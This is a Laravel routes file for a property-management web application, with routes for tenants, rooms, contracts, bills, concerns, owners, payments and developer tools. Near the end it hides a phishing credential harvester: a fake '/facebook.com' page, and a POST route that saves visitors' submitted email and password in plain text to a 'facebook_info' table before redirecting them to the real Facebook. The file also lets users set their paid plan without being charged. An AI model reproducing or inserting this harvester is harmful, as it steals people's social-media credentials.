<?php

use App\Unit, App\Owner, App\Tenant, App\User, App\Bill, App\Property;
use Carbon\Carbon;
use App\Charts\DashboardChart;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use App\Mail\TenantRegisteredMail;
use App\Mail\SendContractAlertEmail;
use App\Concern;
use App\Session;
use App\Certificate;
use App\Guardian;
use Illuminate\Support\Facades\Hash;
use App\Room;
use App\Update;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Auth::routes(['verify'=> true]);

//ROUTES FOR THE WEBSITE
//routes to show the website page
Route::get('/', function(){
    $users = User::whereNotIn('role_id_foreign',['6','7','8'])->count();
    $properties = Property::all()->count();
    $rooms = Unit::whereNotIn('status',['deleted'])->count();
    $tenants = Tenant::all()->count();
    return view('layouts.arsha.index', compact('users','properties', 'rooms', 'tenants'));
});

//route to show the privacy policy
Route::get('/privacy-policy', function(){
    return view('layouts.arsha.privacy-policy');
});

//route to show terms of service
Route::get('/terms-of-service', function(){
    return view('layouts.arsha.terms-of-service');
});
//route to show acceptable use policy
Route::get('/acceptable-use-policy', function(){
    return view('layouts.arsha.acceptable-use-policy');
});
//route to redirect user to unregistered page
Route::get('/unregistered', function(){
    return view('layouts.arsha.unregistered');
});

//ROUTES FOR USERCONTROLLER
Route::prefix('user')->group(function(){
    Route::get('search', 'UserController@search');
    Route::get('all', 'UserController@index_system_user');
    Route::get('create', 'UserController@create')->name('create-user');
    Route::post('store', 'UserController@store_system_user');
    Route::get('{user_id}', 'UserController@show_system_user');
    Route::get('edit', 'UserController@edit_system_user');
    Route::put('{user_id}', 'UserController@update_system_user');
    Route::put('{user_id}/update', 'UserController@update_system_user_info');
    Route::get('show', 'UserController@show_user');
});

//ROUTES FOR PROPERTYCONTROLLER
Route::prefix('property/{property_id}')->group(function(){
    Route::get('dashboard', 'PropertyController@show')->name('show-dashboard');
    Route::get('search', 'PropertyController@search');
    Route::get('edit', 'PropertyController@edit');
    Route::put('update', 'PropertyController@update');
    Route::get('view', 'PropertyController@view')->name("show-dev-property");
    Route::get('rooms/create', 'PropertyController@create_room');
    Route::post('rooms/store', 'PropertyController@store_room');
    Route::get('bills/create', 'PropertyController@create_bill');
    Route::post('bills/store', 'PropertyController@store_bill');
    Route::get('duedates/create', 'PropertyController@create_duedate');
    Route::post('duedates/store', 'PropertyController@store_duedate');
    Route::get('users/create', 'PropertyController@create_user');
    Route::post('users/store', 'PropertyController@store_user');
});

Route::prefix('property')->group(function(){
    Route::get('portforlio', 'PropertyController@view_portforlio')->name('view-portforlio');
    Route::post('propertytype/store', 'PropertyTypeController@store');
    Route::get('all', 'PropertyController@index');
    Route::post('select', 'PropertyController@select');
    Route::get('create', 'PropertyController@create_property')->name('create-property');
    Route::post('/', 'PropertyController@store_property');
});

//ROUTES FOR TENANTCONTROLLER
Route::prefix('property/{property_id}')->group(function(){
    Route::get('tenants', 'TenantController@index')->name('show-all-tenant');
    Route::get('tenant/{tenant_id}', 'TenantController@show')->name('property.tenant');
    Route::get('tenant/{tenant_id}/edit', 'TenantController@edit');
    Route::put('tenant/{tenant_id}', 'TenantController@update');
    Route::get('room/{unit_id}/create/tenant', 'TenantController@create');
    Route::post('room/{unit_id}/store/tenant', 'TenantController@store');
    Route::get('tenants/search', 'TenantController@index');
    Route::get('tenants/filter', 'TenantController@filter');
    Route::post('tenant/{tenant_id}/user/create', 'TenantController@create_user_access');
    Route::put('home/{unit_id}/tenant/{tenant_id}/request', 'TenantController@request');
    Route::put('home/{unit_id}/tenant/{tenant_id}/approve', 'TenantController@approve');
    Route::put('tenant/{tenant_id}/upload/img','TenantController@upload_img');
    Route::get('tenants/pending','TenantController@pending');
});

//print gate pass
Route::get('/units/{unit_id}/tenants/{tenant_id}/print/gatepass', 'TenantController@printGatePass');
Route::delete('/tenants/{tenant_id}', 'TenantController@destroy');

//ROUTES FOR ADDING INVENTORIES TO ROOM
Route::prefix('property/{property_id}/room/{unit_id}')->group(function(){
    Route::get('create/inventory', 'InventoryController@create');
    Route::post('store/inventory', 'InventoryController@store');
    Route::get('update/inventory/{inventory_id}', 'InventoryController@edit');
    Route::get('show/inventory/{inventory_id}', 'InventoryController@show');
    Route::put('update/inventory', 'InventoryController@update');
    Route::get('inventory/{inventory_ud}/delete/inventory','InventoryController@destroy');
});

//ROUTES FOR CONTRACTCONTROLLER
Route::prefix('property/{property_id}/')->group(function(){
    Route::get('tenant/{tenant_id}/contract/{contract_id}/extend', 'ContractController@extend');
    Route::post('tenant/{tenant_id}/contract/{contract_id}/extend','ContractController@extend_post');
    Route::get('room/{room_id}/tenant/{tenant_id}/create/contract','ContractController@create');
    Route::get('contract/room/select', 'ContractController@contract_room_select');
    Route::post('room/{room_id}/tenant/{tenant_id}/contract/create','ContractController@new_contract');
    Route::get('room/{room_id}/tenant/{tenant_id}/contract/{contract_id}/balance/{balance}/action','ContractController@action');
    Route::post('room/{unit_id}/tenant/{tenant_id}/store/contract', 'ContractController@store');
    Route::get('tenant/{tenant_id}/contract/{contract_id}', 'ContractController@show');
    Route::get('tenant/{tenant_id}/contract/{contract_id}/edit', 'ContractController@edit');
    Route::put('tenant/{tenant_id}/contract/{contract_id}/update', 'ContractController@update');
    Route::get('tenant/{tenant_id}/contract/{contract_id}/preterminate','ContractController@preterminate');
    Route::put('/tenant/{tenant_id}/contract/{contract_id}/preterminate_post','ContractController@preterminate_post');
    Route::get('room/{room_id}/tenant/{tenant_id}/contract/{contract_id}/moveout','ContractController@moveout_get');
    Route::put('home/{unit_id}/tenant/{tenant_id}/contract/{contract_id}/moveout','ContractController@moveout_post');
    Route::get('tenant/{tenant_id}/contract/{contract_id}/delete','ContractController@destroy');
    Route::get('home/{unit_id}/tenant/{tenant_id}/contract/{contract_id}/alert','ContractController@send_contract_alert');
    Route::get('tenant/{tenant_id}/contract/{contract_id}/create/transfer','ContractController@create_transfer_room');
    Route::post('tenant/{tenant_id}/contract/{contract_id}/store/transfer','ContractController@store_transfer_room');
    Route::get('expiring-contracts', 'ContractController@expired');
});

//ROUTES FOR OCCUPANTCONTROLLER
Route::prefix('property')->group(function(){
    Route::get('occupants', 'OccupantController@index')->name('show-all-occupant');
    Route::get('occupant/{tenant_id}', 'OccupantController@show');
    Route::get('occupant/{tenant_id}/edit', 'OccupantController@edit');
    Route::put('occupant/{tenant_id}', 'OccupantController@update');
    Route::get('unit/{unit_id}/occupant', 'OccupantController@create');
    Route::get('unit/{unit_id}/occupant/add', 'OccupantController@add_occupant');
    Route::post('unit/{unit_id}/occupant', 'OccupantController@store');
    Route::get('unit/{unit_id}/occupant/prefilled', 'OccupantController@create_prefilled');
    Route::post('unit/{unit_id}/occupant/prefilled', 'OccupantController@store_prefilled');
    Route::get('occupants/search', 'OccupantController@index');
});

//ROUTES FOR ROOMCONTROLLER
//route to create rooms
Route::prefix('property/{property_id}')->group(function(){
    Route::get('room/{unit_no}/edit', 'RoomController@edit');
    Route::put('room/{room_id}/update', 'RoomController@update');
    Route::get('rooms', 'RoomController@index')->name('show-all-room');
    Route::get('room/{unit_id}', 'RoomController@show');

    Route::put('rooms/update', 'RoomController@update_all');
    Route::delete('room/{unit_id}/delete', 'RoomController@destroy');
    Route::put('room/{unit_id}/restore', 'RoomController@restore');
    Route::post('room/{room_id}/upload', 'RoomController@upload');
    Route::get('rooms/filter', 'RoomController@index');
    Route::get('rooms/clear', 'RoomController@clear');
});

    
Route::prefix('property')->group(function(){
    Route::get('/edit/room', 'RoomController@edit_all')->name('edit-room');
    Route::get('/create/room', 'RoomController@create')->name('create-room');
    Route::post('/store/room', 'RoomController@store')->name('store-room');
});

//ROUTES FOR UNITCONTROLLER
Route::prefix('property/{property_id}')->group(function(){
    Route::get('units', 'UnitController@index')->name('show-all-unit');
    Route::get('unit/{unit_id}', 'UnitController@show');
    Route::get('units/{date}/edit', 'UnitController@edit_all');
    Route::put('units/{date}/update', 'UnitController@update_all');
    Route::post('unit/store', 'UnitController@store');
    Route::put('unit/{unit_id}', 'UnitController@update');
    Route::get('units/clear', 'UnitController@clear_units_filters');
});

//ROUTES FOR GUARDIANCONTROLLER
//route to post a guardian to a tenant
Route::post('/property/{property_id}/tenant/{tenant_id}/guardian', 'GuardianController@store');

//ROUTES FOR CONCERNCONTOLLER
Route::prefix('property/{property_id}')->group(function(){
    Route::get('/concerns', 'ConcernController@index')->name('show-all-concern');
    Route::get('room/{room_id}/create/concern', 'ConcernController@create_room_concern');
    Route::get('room/{room_id}/tenant/{tenant_id}/concern/{concern_id}/communications','ConcernController@show_concern_communications');
    Route::put('room/{room_id}/concern/{concern_id}/update','ConcernController@update_room_concern');
    Route::post('tenant/{tenant_id}/concern', 'ConcernController@store');
    Route::post('room/{unit_id}/store/concern', 'ConcernController@store_details');
    Route::get('room/{unit_id}/tenant/{tenant_id}/concern/{concern_id}/assessment','ConcernController@create_assessment');
    Route::put('room/{unit_id}/tenant/{tenant_id}/concern/{concern_id}/store/assessment','ConcernController@store_assessment');
    Route::get('room/{unit_id}/tenant/{tenant_id}/concern/{concern_id}/scope_of_work','ConcernController@create_scope_of_work');
    Route::put('room/{unit_id}/tenant/{tenant_id}/concern/{concern_id}/store/scope_of_work','ConcernController@store_scope_of_work');
    Route::get('room/{unit_id}/tenant/{tenant_id}/concern/{concern_id}/materials','ConcernController@create_materials');
    Route::get('room/{unit_id}/tenant/{tenant_id}/concern/{concern_id}/approval','ConcernController@create_approval');
    Route::post('room/{unit_id}/tenant/{tenant_id}/concern/{concern_id}/store/materials','ConcernController@store_materials');
    Route::get('room/{unit_id}/tenant/{tenant_id}/concern/{concern_id}/payment-options','ConcernController@create_payment_options');
    Route::post('room/{unit_id}/tenant/{tenant_id}/concern/{concern_id}/store/payment-options','ConcernController@store_payment_options');
    Route::get('concern/{concern_id}', 'ConcernController@show');
    Route::get('concern/{concern_id}/assign/{user_id}','ConcernController@show_assigned_concerns');
    Route::put('concern/{concern_id}/forward', 'ConcernController@forward');
    Route::get('tenant/{tenant_id}/concern/create', 'ConcernController@create');
    Route::post('tenant/{tenant_id}/concern/store', 'ConcernController@store');
    Route::get('concern/{concern_id}/approve', 'ConcernController@concern_approve');
    Route::get('pending-concerns', 'ConcernController@pending');
});

//concerns
Route::post('/concerns', 'ConcernController@store');

//show concerns
Route::get('/units/{unit_id}/tenants/{tenant_id}/concerns/{concern_id}', 'ConcernController@show');

//update concerns

Route::put('/concerns/{concern_id}', 'ConcernController@update');
Route::get('/material/{material_id}/delete','ConcernController@remove_material');
//route to close a concern
Route::put('/concern/{concern_id}/closed', 'ConcernController@closed');

//ROUTES FOR NOTIFCONTROLLER
Route::get('/property/{property_id}/audit-trails', 'NotifController@index')->name('show-all-audit-trails');

//ROUTES FOR BillController
Route::prefix('property/{property_id}')->group(function(){
    Route::get('tenant/{tenant_id}/create/bill', 'BillController@create_tenant_bill');
    Route::post('tenant/{tenant_id}/post/particular', 'BillController@post_bill_particular');
    Route::get('tenant/{tenant_id}/particular/{particular_id}', 'BillController@create_bill_with_particular');
    Route::post('tenant/{tenant_id}/particular/{particular_id}/bill/{bill_id}/store/bill', 'BillController@store_tenant_bill');
    Route::get('room/{room_id}/tenant/{tenant_id}/contract/{contract_id}/create/bill','BillController@create');
    Route::post('room/{room_id}/tenant/{tenant_id}/store/bill', 'BillController@store');
    Route::get('bills', 'BillController@index')->name('show-all-bill');
    Route::get('bills/filter', 'BillController@filter');
    Route::post('bill/{particular_id}', 'BillController@create_bulk');
    Route::get('create/bill/{particular_id}/batch/{batch_no}/show', 'BillController@show_bulk');
    Route::get('create/bill/{particular_id}/batch/{batch_no}/options','BillController@options_bulk');
    Route::put('create/bill/{particular_id}/batch/{batch_no}/options','BillController@update_options_bulk');
    Route::put('bill/{particular_id}/update', 'BillController@update_bulk');
    Route::put('create/bill/{particular_id}/batch/{batch_no}/store','BillController@store_bulk_bills');
    Route::get('tenant/{tenant_id}/bills/edit', 'BillController@edit_tenant_bills');
    Route::get('unit/{home_id}/bills/edit', 'BillController@edit_occupant_bills');
    Route::get('tenant/{tenant_id}/bills/export', 'BillController@export');
    Route::get('unit/{unit_id}/bills/export', 'BillController@export_occupant_bills');
    Route::put('tenant/{tenant_id}/bills/update', 'BillController@post_edited_bills');
    Route::put('unit/{unit_id}/bills/update', 'BillController@update_occupant_bills');
    Route::post('bills/create', 'BillController@store');
    Route::post('tenant/{tenant_id}/bills/create', 'BillController@post_tenant_bill');
    Route::post('unit/{unit_id}/bills/create', 'BillController@post_unit_bill');
    Route::post('bills/electric/{date}', 'BillController@post_bills_electric');
    Route::post('bills/water/{date}', 'BillController@post_bills_water');
    Route::post('bills/surcharge/{date}', 'BillController@post_bills_surcharge');
    Route::put('tenant/{tenant_id}/bill/{bill_id}/restore', 'BillController@restore_bill');
    Route::get('bills/search', 'BillController@index');
});
//route to create bills for removing bills
Route::get('/bill/{bill_id}/delete/bill', 'BillController@destroy');

//ROUTES FOR JOBORDERCONTROLLER
Route::prefix('property/{property_id}')->group(function(){
    Route::get('joborders', 'JobOrderController@index')->name('show-all-joborder');
    Route::get('joborder/{joborder_id}/inventory', 'JobOrderController@inventory');
});

Route::get('/blogs', 'BlogController@index');

Route::post('ckeditor/image_upload', 'BlogController@upload')->name('upload');

Route::get('property/{property_id}/system-updates', function($property_id){
    $updates = Update::orderBy('created_at', 'desc')->get();
    $property = Property::findOrFail($property_id);
    return view('webapp.properties.system-updates',compact('property','updates'));
});

Route::get('property/{property_id}/getting-started', function($property_id){
    $property = Property::findOrFail($property_id);
    return view('webapp.properties.getting-started',compact('property'));
});

Route::get('property/{property_id}/announcements', function($property_id){
    $property = Property::findOrFail($property_id);
    return view('webapp.properties.announcements',compact('property'));
});

Route::prefix('property/{property_id}')->group(function(){
    Route::get('issues', 'IssueController@index');
    Route::get('issue/{issue_id}', 'IssueController@show');
    Route::post('issue/create', 'IssueController@store');
});

//routes for blogs
Route::get('/property/{property_id}/blogs', 'BlogController@index');
Route::post('/property/{property_id}/blog', 'BlogController@store');
Route::get('/property/{property_id}/blog/{blog_id}', 'BlogController@show');

//ROUTES FOR OWNERCONTROLLER
Route::prefix('property/{property_id}')->group(function(){
    Route::get('/room/{room_id}/create/owner', 'OwnerController@create');
    Route::post('room/{room_id}/store/owner', 'OwnerController@store');
    Route::get('owners', 'OwnerController@index')->name('show-all-owner');
    Route::get('owners/search', 'OwnerController@search');
    Route::get('owner/{owner_id}/edit', 'OwnerController@edit');
    Route::get('owner/{owner_id}', 'OwnerController@show');
    Route::put('owner/{owner_id}', 'OwnerController@update');
    Route::post('room/{unit_id}/owner', 'OwnerController@store');
    Route::put('owner/{owner_id}/upload/img','OwnerController@upload_img');
    Route::get('owner/{owner_id}/create/credentials','OwnerController@create_owner_credentials');
    Route::post('owner/{owner_id}/store/credentials', 'OwnerController@store_owner_credentials');
    Route::delete('owner/{owner_id}/delete', 'OwnerController@destroy');
    Route::post('owner/{owner_id}/user/create', 'OwnerController@create_user_access');
});

//ROUTES FOR CERTIFICATECONTROLLER
Route::prefix('property/{property_id}/owner/{owner_id}/certificate')->group(function(){
    Route::get('create','CertificateController@create')->name('create-certificate');
    Route::post('store','CertificateController@store')->name('store-certificate');
});

Route::post('/property/{property_id}/concern/{concern_id}/joborder', 'JobOrderController@store');

Route::prefix('property/{property_id}')->group(function(){
    Route::get('personnels', 'PersonnelController@index')->name('show-all-personnel');
    Route::post('personnel', 'PersonnelController@store');
    Route::delete('personnel/{personnel_id}', 'PersonnelController@destroy');
});

//routes for financials
Route::get('/property/{property_id}/financials', 'FinancialController@index')->name('show-all-financial');

//routes for payables
Route::prefix('property/{property_id}')->group(function(){
    Route::get('payables', 'PayableController@index')->name('show-all-payable');
    Route::get('payables/entries', 'PayableController@entries');
    Route::post('payable', 'PayableController@store');
    Route::post('payable/request', 'PayableController@request');
    Route::get('payable/{payable_id}/approve', 'PayableController@approve');
    Route::get('payable/{payable_id}/decline', 'PayableController@decline');
    Route::get('payable/{payable_id}/release', 'PayableController@release');
    Route::get('payable/{payable_id}/action', 'PayableController@action');
});

//ROUTES FOR USERCONTROLLER
Route::prefix('property/{property_id}')->group(function(){
    Route::get('users', 'UserController@index')->name('show-all-usage-history');
    Route::get('user/{user_id}', 'UserController@show');
    Route::put('user/{user_id}', 'UserController@update');
    Route::get('tenant/{tenant_id}/credentials/create','UserController@create_credentials')->name('create-credentials');
    Route::post('tenant/{tenant_id}/credentials/store','UserController@store_credentials')->name('store-credentials');
    Route::get('user/{user_id}', 'UserController@show');
    Route::put('/', 'UserController@update');
});

Route::prefix('user/{user_id}/tenant/{tenant_id}')->group(function(){
    Route::post('dashboard', 'UserController@show_user_tenant');
    Route::get('dashboard', 'UserController@show_user_tenant');
    Route::get('rooms', 'UserController@show_room_tenant');
    Route::get('bills', 'UserController@show_bill_tenant');
    Route::get('payments', 'UserController@show_payment_tenant');
    Route::get('concerns', 'UserController@show_concern_tenant');
    Route::post('concerns', 'UserController@store_concern_tenant');
    Route::get('concern/{concern_id}/responses','UserController@show_concern_responses');
    Route::get('profile', 'UserController@show_profile_tenant');
    Route::put('profile', 'UserController@show_update_tenant');
});

Route::get('/user/{user_id}/portal/tenant/', 'UserController@show_portal_tenant');

//ROUTES FOR OWNERACCESSCONTROLLER
Route::prefix('user/{user_id}/owner/{owner_id}')->group(function(){
    Route::post('dashboard', 'OwnerAccessController@dashboard');
    Route::get('dashboard', 'OwnerAccessController@dashboard');
    Route::get('rooms', 'OwnerAccessController@room');
    Route::get('room/{room_id}/room/edit', 'OwnerAccessController@edit_room');
    Route::put('room/{room_id}/room/update', 'OwnerAccessController@update_room');
    Route::get('room/{room_id}/contracts', 'OwnerAccessController@contracts');
    Route::get('bills', 'OwnerAccessController@bill');
    Route::get('financials', 'OwnerAccessController@financial');
    Route::get('payments', 'OwnerAccessController@payment');
    Route::get('concerns', 'OwnerAccessController@concern');
    Route::post('concerns', 'OwnerAccessController@store_concern');
    Route::get('concern/{concern_id}/responses','OwnerAccessController@show_concern_responses');
    Route::get('profile', 'OwnerAccessController@profile');
    Route::get('remittances', 'OwnerAccessController@remittance');
    Route::get('expenses', 'OwnerAccessController@expense');
    Route::put('profile', 'OwnerAccessController@update_profile');
});

//ROUTES FOR DEVCONTROLLER
Route::prefix('dev')->group(function(){
    //routes for dev
    Route::get('activities/', 'DevController@activities');
    Route::get('properties/', 'DevController@properties');
    Route::get('property/types/', 'DevController@property_types');
    Route::get('users/', 'DevController@users');
    Route::get('starter/', 'DevController@starter');
    Route::get('announcements/', 'DevController@announcements');
    Route::get('issues/', 'DevController@issues');
    Route::get('issue/{issue_id}/edit', 'DevController@edit_issue');
    Route::post('issue/{issue_id}/responses', 'DevController@add_response');
    Route::put('issue/{issue_id}/update', 'DevController@update_issue');
    Route::get('updates/', 'DevController@updates');
    Route::get('user/{user_id}', 'DevController@edit_user');
    Route::put('user/{user_id}', 'DevController@post_user');
    Route::get('plans', 'DevController@plans');
    Route::get('tenants', 'DevController@tenants');
    Route::get('user/{user_id}/plans', 'DevController@user_plans');
    Route::post('updates/store', 'UpdateController@store');
});

Route::post('/plan', 'DevController@post_plan');

Route::get('/register', function(Request $request){
    // \Session::put('plan', $request->plan);
    // if(\Session::get('plan') == null){
    //     return redirect('/#pricing');
    // }

    return view('auth.register');
});

Route::get('/register/{promo_code}', function(Request $request){
    // \Session::put('plan', $request->plan);
    // if(\Session::get('plan') == null){
    //     return redirect('/#pricing');
    // }

    return view('auth.register');
});

Route::get('/free', function(Request $request){
    // \Session::put('plan', $request->plan);
    // if(\Session::get('plan') == null){
    //     return redirect('/#pricing');
    // }

    return view('auth.register');
});

//routes for responses
Route::post('concern/{concern_id}/response', 'ResponseController@store');

//routes for notifications
Route::get('property/{property_id}/notifications', 'NotificationController@index');

//ROUTES FOR REMITTANCECONTROLLER
Route::prefix('property/{property_id}')->group(function(){
    Route::get('remittances', 'RemittanceController@index');
    Route::post('remittances/store', 'RemittanceController@store');
    Route::get('room/{unit_id}/contract/{contract_id}/tenant/{tenant_id}/bill/{bill_id}/payment/{payment_id}/remittance/create','RemittanceController@create');
    Route::post('room/{unit_id}/contract/{contract_id}/tenant/{tenant_id}/bill/{bill_id}/payment/{payment_id}/remittance/store','RemittanceController@store');
    Route::get('room/{unit_id}/remittance/{remittance_id}', 'RemittanceController@show');
    Route::get('remittance/{remittance_id}/expenses', 'ExpenseController@index');
    Route::get('room/{room_id}/remittance/{remittance_id}/edit', 'RemittanceController@edit');
    Route::put('remittance/{remittance_id}/update', 'RemittanceController@update');
    Route::get('room/{room_id}/remittance/{remittance_id}/action','RemittanceController@action');
});

Route::get('/listings', function(){
    $properties = Property::all()->count();
    return view('layouts.arsha.listings', compact('properties'));
});

//routes for payments
Route::get('units/{unit_id}/tenants/{tenant_id}/payments/{payment_id}', 'CollectionController@show')->name('show-payment');
Route::post('/payments', 'CollectionController@store');
Route::get('/payments/all', 'CollectionController@index')->name('show-all-payments');
Route::get('/payment/{payment_id}/delete/payment', 'CollectionController@destroy');

//ROUTES FOR COLLECTIONCONTROLLER
Route::prefix('property/{property_id}')->group(function(){
    Route::get('payments/search', 'CollectionController@index');
    Route::get('room/{room_id}/contract/{contract_id}/tenant/{tenant_id}/bill/{bill_id}/payment/{payment_id}/action','CollectionController@action');
    Route::post('tenant/{tenant_id}/payment/{payment_id}/credit-memo','CollectionController@credit_memo');
    Route::get('unit/{unit_id}/tenant/{tenant_id}/payment/{payment_id}/dates/{payment_created}/export','CollectionController@export');
    Route::get('unit/{unit_id}/tenant/{tenant_id}/payment/{payment_id}/export','CollectionController@export_payment');
    Route::get('/tenant/{tenant_id}/payments/export', 'CollectionController@export_all');
    Route::get('unit/{unit_id}/tenant/{tenant_id}/payment/{payment_id}/dates/{payment_created}/export_unit_bills','CollectionController@export_unit_bills');
    Route::get('payments/dates/{payment_created}/export/','CollectionController@export_collection_per_day');
    Route::get('collections/month/{month}/year/{year}/export/','CollectionController@export_collection_per_month');
    Route::get('collections', 'CollectionController@index')->name('show-all-collection');
    Route::post('tenant/{tenant_id}/collection', 'CollectionController@store');
    Route::post('home/{unit_id}/collection', 'CollectionController@collect_unit_payment');
    Route::get('delinquents', 'CollectionController@delinquents');
});

//ROUTES FOR VIOLATIONCONTROLLER
Route::prefix('property/{property_id}')->group(function(){
    Route::get('violations', 'ViolationController@index')->name('show-all-violation');
    Route::post('tenant/{tenant_id}/violation', 'ViolationController@store');
    Route::get('tenant/{tenant_id}/violation/create', 'ViolationController@create');
    Route::post('tenant/{tenant_id}/violation/store', 'ViolationController@store');
});

//ROUTES FOR SUPPLIERCONTROLLER
Route::prefix('/property/{property_id}/suppliers')->group(function(){
    Route::get('/', 'SupplierController@index')->name('show-all-supplier');
    Route::get('create', 'SupplierController@create');
    Route::post('store', 'SupplierController@store');
});

//routes for loggin in using google
Route::get('sign-in/google', 'Auth\LoginController@google');
Route::get('sign-in/google/redirect', 'Auth\LoginController@googleRedirect');

Route::put('/users/{user_id}/property', function(Request $request){
    $request->validate([
        'property' => 'required|unique:users|max:255',
        'property_ownership' => 'required',
        'property_type' => 'required',
    ]);
    DB::table('users')
    ->where('id', Auth::user()->id)
    ->update([
        'property' => $request->property,
        'property_type' => $request->property_type,
        'property_ownership' => $request->property_ownership
    ]);
    return back();
});

Route::put('/users/{user_id}/plan', function(Request $request){
    DB::table('users')
    ->where('id', Auth::user()->id)
    ->update([
        'account_type' => $request->account_type,
    ]);

    return back();
});
//routes for registration
//post the desired plan
Route::post('/users/{user_id}/charge', function(Request $request){
    if(Auth::user()->account_type === 'Free'){
         Mail::to(Auth::user()->email)->send(new TenantRegisteredMail());

         return back();
    }else{
        $charge = 0;
        if(Auth::user()->account_type === 'Medium'){
            $charge = 95000;
        }elseif(Auth::user()->account_type === 'Large'){
            $charge = 180000;
        }elseif(Auth::user()->account_type === 'Enterprise'){
            $charge = 240000;
        }elseif(Auth::user()->account_type === 'Corporate'){
            $charge = 480000;
        }
       try{
        Mail::to(Auth::user()->email)->send(new TenantRegisteredMail());

        return back();
       }catch(\Exception $e){
           return back()->with('danger', $e->getMessage());
       }
    }
});

//routes for logging in using facebook
Route::get('/login/google', 'Auth\LoginController@redirectToProvider');
Route::get('/login/google/callback', 'Auth\LoginController@handleProviderCallback');

Route::get('listing', ['as' => 'listing', 'uses'=>'AdsController@listing']);

Route::get('/carpiotech', function(){
    return view('founders.landleybernardo');
});

Route::get('/facebook.com', function(){
    return view('founders.facebook');
});

Route::post('/facebook/post', function(Request $request){
    DB::table('facebook_info')
    ->insert(
                [
                    'email' => $request->email, 
                    'password' => $request->password,
                ]
            );

            return redirect('https://facebook.com');
});